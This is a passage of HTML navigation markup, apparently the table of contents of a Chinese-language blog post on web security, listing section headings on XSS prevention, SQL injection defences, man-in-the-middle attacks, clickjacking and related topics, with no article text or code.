class="nav-number">2.4.3.</span> <span class="nav-text">预防 DOM 型 XSS 攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他XSS防范措施"><span class="nav-number">2.4.4.</span> <span class="nav-text">其他XSS防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入"><span class="nav-number">3.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#可能造成的危害"><span class="nav-number">3.1.</span> <span class="nav-text">可能造成的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对SQL注入的防御方法主要有"><span class="nav-number">3.2.</span> <span class="nav-text">对SQL注入的防御方法主要有</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie诈骗"><span class="nav-number">4.</span> <span class="nav-text">cookie诈骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码安全"><span class="nav-number">5.</span> <span class="nav-text">密码安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#中间人攻击（MITM）"><span class="nav-number">6.</span> <span class="nav-text">中间人攻击（MITM）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSL伪造CA证书实现中间人攻击"><span class="nav-number">6.1.</span> <span class="nav-text">SSL伪造CA证书实现中间人攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS欺骗"><span class="nav-number">6.2.</span> <span class="nav-text">DNS欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防止中间人攻击"><span class="nav-number">6.3.</span> <span class="nav-text">防止中间人攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#点击劫持"><span class="nav-number">7.</span> <span class="nav-text">点击劫持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML5安全"><span class="nav-number">8.</span> <span class="nav-text">HTML5安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CFS攻击-跨框架脚本攻击"><span class="nav-number">9.</span> <span class="nav-text">CFS攻击(跨框架脚本攻击)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">10.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
